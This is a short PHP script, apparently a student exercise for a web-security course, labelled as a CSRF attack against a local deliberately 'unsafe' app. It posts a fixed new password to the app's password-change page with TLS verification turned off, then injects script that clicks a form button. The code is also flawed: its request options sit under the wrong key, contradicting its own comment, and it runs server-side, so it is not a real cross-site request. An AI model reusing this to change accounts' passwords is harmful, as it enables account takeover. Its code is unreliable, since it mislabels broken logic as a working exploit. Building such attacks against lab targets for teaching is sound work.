<?php

// CSRF ATTACK!!!!!! Ändrar lösenord hos den inloggade användaren.

session_start();

if(isset($_SESSION["loggedin"])&& isset($_SESSION["username"])){
    $url = 'https://localhost/EITF05-unsafe/login/change-pwd.php';
    $data = array('new_password' => 'hejhejhejhejhejheJ123', 'confirm_password' => 'hejhejhejhejhejheJ123');

    // use key 'http' even if you send the request to https://...
    $options = array(
    'ssl' => array(
        'header'            => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'            => 'POST',
        'content'           => http_build_query($data),
        "verify_peer"       => false,
        "verify_peer_name"  => false
    )
    );
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    if ($result === FALSE) { /* Handle error */ }


    var_dump($result);

    echo "<script type='text/javascript'>
                   document.getElementById('subbtn').click();
                 </script>";



}else{
  header("location: index.php");
}



 ?>
